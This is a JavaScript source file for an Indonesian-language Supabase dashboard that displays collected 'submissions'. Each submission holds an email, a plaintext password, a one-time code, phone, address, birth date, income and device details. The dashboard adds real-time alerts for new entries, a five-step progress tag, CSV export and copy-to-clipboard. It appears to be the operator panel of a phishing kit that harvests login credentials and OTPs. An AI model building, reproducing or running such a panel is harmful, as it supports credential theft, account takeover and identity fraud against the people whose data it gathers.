(function () {
  'use strict';

  const C = window.CONFIG || {};
  const sb = supabase.createClient(C.SUPABASE_URL, C.SUPABASE_ANON_KEY);

  const gate = document.getElementById('gate');
  const dash = document.getElementById('dash');
  const list = document.getElementById('list');
  const stat = document.getElementById('stat');
  const authErr = document.getElementById('authErr');
  const q = document.getElementById('q');
  const toastEl = document.getElementById('toast');

  let rows = [];
  let newest = null;

  const LABELS = {
    phone: 'Nomor HP', full_name: 'Nama', age: 'Umur', birth_date: 'Tgl lahir',
    gender: 'Gender', address: 'Alamat', city: 'Kota', province: 'Provinsi',
    postal_code: 'Kode pos', occupation: 'Pekerjaan', income: 'Pendapatan',
    otp: 'OTP', user_agent: 'Perangkat', page_url: 'URL', referrer: 'Referrer',
    screen: 'Layar', timezone: 'Zona waktu', session_id: 'Sesi'
  };
  const SKIP = ['id', 'created_at', 'updated_at', 'email', 'password', 'step'];

  document.getElementById('btnLogin').addEventListener('click', login);
  document.getElementById('aPass').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') login();
  });

  async function login() {
    const email = document.getElementById('aEmail').value.trim();
    const password = document.getElementById('aPass').value;
    authErr.textContent = '';
    if (!email || !password) {
      authErr.textContent = 'Email dan kata sandi wajib diisi.';
      return;
    }
    const { error } = await sb.auth.signInWithPassword({ email, password });
    if (error) {
      authErr.textContent = 'Gagal masuk: ' + error.message;
      return;
    }
    start();
  }

  document.getElementById('btnOut').addEventListener('click', async () => {
    await sb.auth.signOut();
    location.reload();
  });

  document.getElementById('btnCsv').addEventListener('click', () => {
    if (!rows.length) return;
    const cols = Object.keys(rows[0]).filter((k) => k !== 'id');
    const esc = (v) => '"' + String(v === null || v === undefined ? '' : v).replace(/"/g, '""') + '"';
    const csv = [cols.join(',')]
      .concat(rows.map((r) => cols.map((c) => esc(r[c])).join(',')))
      .join('\r\n');

    const a = document.createElement('a');
    a.href = URL.createObjectURL(new Blob(['\ufeff' + csv], { type: 'text/csv' }));
    a.download = 'data-' + Date.now() + '.csv';
    a.click();
    URL.revokeObjectURL(a.href);
  });

  q.addEventListener('input', render);

  async function start() {
    const { data } = await sb.auth.getUser();
    if (!data || !data.user) return;
    gate.classList.add('hide');
    dash.classList.remove('hide');
    await load();
    subscribe();
  }

  async function load() {
    const { data, error } = await sb
      .from('submissions')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(300);

    if (error) {
      list.innerHTML = '<div class="empty">Gagal memuat: ' + error.message + '</div>';
      return;
    }
    rows = data || [];
    render();
  }

  function subscribe() {
    sb.channel('live')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'submissions' }, (p) => {
        if (p.eventType === 'INSERT') {
          newest = p.new.id;
          toast('Data baru masuk');
        }
        load();
      })
      .subscribe();
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add('on');
    setTimeout(() => toastEl.classList.remove('on'), 2200);
  }

  function render() {
    const term = q.value.trim().toLowerCase();
    const view = term
      ? rows.filter((r) =>
          [r.email, r.full_name, r.phone, r.city, r.occupation]
            .filter(Boolean).join(' ').toLowerCase().includes(term))
      : rows;

    const today = new Date().toDateString();
    const todayCount = rows.filter((r) => new Date(r.created_at).toDateString() === today).length;
    stat.textContent = rows.length + ' total · ' + todayCount + ' hari ini';

    if (!view.length) {
      list.innerHTML = '<div class="empty">' + (term ? 'Tidak ada yang cocok.' : 'Belum ada data masuk.') + '</div>';
      return;
    }

    list.innerHTML = '';
    view.forEach((r) => {
      const card = document.createElement('div');
      card.className = 'card' + (r.id === newest ? ' new' : '');

      const head = document.createElement('div');
      head.className = 'head';
      head.innerHTML =
        '<span class="email">' + esc(r.email || '(tanpa email)') + '</span>' +
        '<span class="time">' + new Date(r.created_at).toLocaleString('id-ID') + '</span>';
      card.append(head);

      if (r.password) {
        const pw = document.createElement('div');
        pw.className = 'pw';
        pw.textContent = r.password;
        card.append(pw);
      }

      const rowsBox = document.createElement('div');
      rowsBox.className = 'rows';
      Object.keys(LABELS).forEach((k) => {
        if (!r[k]) return;
        const row = document.createElement('div');
        row.className = 'row';
        row.innerHTML = '<span class="k">' + LABELS[k] + '</span><span class="v">' + esc(String(r[k])) + '</span>';
        rowsBox.append(row);
      });
      card.append(rowsBox);

      const tag = document.createElement('span');
      tag.className = 'stepTag';
      tag.textContent = 'tahap ' + (r.step || 1) + ' / 5';
      rowsBox.append(tag);

      const acts = document.createElement('div');
      acts.className = 'cardActs';
      acts.innerHTML =
        '<button data-copy="' + r.id + '">Salin ringkasan</button>' +
        '<button class="del" data-del="' + r.id + '">Hapus</button>';
      card.append(acts);

      list.append(card);
    });
  }

  function esc(s) {
    return String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  }

  list.addEventListener('click', async (e) => {
    const copyId = e.target.dataset.copy;
    const delId = e.target.dataset.del;

    if (copyId) {
      const r = rows.find((x) => x.id === copyId);
      if (!r) return;
      const text = Object.keys(LABELS)
        .filter((k) => r[k])
        .map((k) => LABELS[k] + ': ' + r[k])
        .join('\n');
      await navigator.clipboard.writeText(text);
      toast('Ringkasan disalin');
    }

    if (delId) {
      if (!confirm('Hapus data ini?')) return;
      await sb.from('submissions').delete().eq('id', delId);
      load();
    }
  });

  sb.auth.getSession().then(({ data }) => {
    if (data && data.session) start();
  });
})();